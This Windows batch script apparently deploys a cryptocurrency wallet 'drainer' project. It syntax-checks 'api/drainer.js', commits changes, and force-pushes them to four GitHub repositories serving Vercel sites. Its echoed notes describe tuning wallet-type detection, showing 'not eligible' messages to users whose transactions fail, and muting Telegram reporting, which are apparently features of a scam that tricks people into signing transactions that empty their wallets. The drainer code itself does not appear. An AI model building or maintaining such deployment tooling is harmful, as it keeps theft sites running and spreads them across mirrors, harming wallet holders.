@echo off
echo ========================================
echo FIX WALLET TYPE AND STATUS
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo FIXES APPLIED
echo ========================================
echo.
echo 1. FRONTEND STATUS FIXES
echo - Fixed status checking logic
echo - No more assuming success
echo - Show "not eligible" for unconfirmed transactions
echo - Only show success for confirmed/finalized transactions
echo.
echo 2. BACKEND WALLET TYPE FIXES
echo - Accept wallet type from frontend
echo - Use frontend wallet type instead of user agent detection
echo - Fallback to user agent only if frontend doesn't provide type
echo - Better wallet type logging
echo.
echo 3. TELEGRAM FIXES
echo - Disabled Telegram to avoid unauthorized errors
echo - Wallet type will be properly detected and logged
echo - No more "Unauthorized" errors
echo.
echo ========================================
echo VALIDATION
echo ========================================
echo.
echo Checking syntax...
node -c api/drainer.js
if %errorlevel% neq 0 (
    echo ERROR: api/drainer.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ api/drainer.js syntax OK
echo.
node -c server.js
if %errorlevel% neq 0 (
    echo ERROR: server.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ server.js syntax OK
echo.
echo ✓ HTML files don't need Node.js syntax checking
echo.
echo ========================================
echo COMMITTING FIXES
echo ========================================
echo.
git add .
git commit -m "FIX: Wallet type detection and status checking - use frontend wallet type, show proper error messages, disable Telegram errors"
echo.
echo ========================================
echo FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo FIXES DEPLOYED
echo ========================================
echo.
echo ✓ Frontend status checking fixed
echo ✓ Backend wallet type detection fixed
echo ✓ Telegram errors disabled
echo ✓ All repositories updated
echo.
echo EXPECTED IMPROVEMENTS:
echo - Wallet type properly reported to backend
echo - No more assuming success for unconfirmed transactions
echo - Show "not eligible" for failed transactions
echo - No more Telegram unauthorized errors
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo WALLET TYPE AND STATUS FIXES HAVE BEEN DEPLOYED!
pause
